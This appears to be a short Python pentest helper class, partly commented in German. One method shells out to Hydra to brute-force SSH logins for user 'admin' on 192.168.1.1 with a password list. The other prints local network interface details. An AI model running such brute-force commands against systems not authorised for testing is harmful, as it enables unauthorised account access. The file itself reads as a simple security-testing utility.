import subprocess
import socket
import psutil
import ipaddress

class PenTest:

    @staticmethod
    def run_hydra():
        """Hydra"""
        try:
            result = subprocess.run(
                ['hydra', '-l', 'admin', '-P', 'passwords.txt', '192.168.1.1', 'ssh'],
                capture_output=True,
                text=True
            )
            print("Hydra output:")
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"Command failed with error: {e}")

    @staticmethod
    def get_network():
        """Get local network information."""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        print(f"Hostname: {hostname}")
        print(f"Lokale IP-Adresse: {local_ip}")

        print("\nNetzwerkschnittstellen:")
        for interface_name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:  # IPv4-Adressen
                    ip_address = addr.address
                    netmask = addr.netmask
                    broadcast = addr.broadcast

                    network = ipaddress.IPv4Network(f"{ip_address}/{netmask}", strict=False)

                    print(f"Schnittstelle: {interface_name}")
                    print(f"  IP-Adresse: {ip_address}")
                    print(f"  Subnetzmaske: {netmask}")
                    print(f"  Broadcast-Adresse: {broadcast}")
                    print(f"  Netzwerkbereich: {network}")
                    print()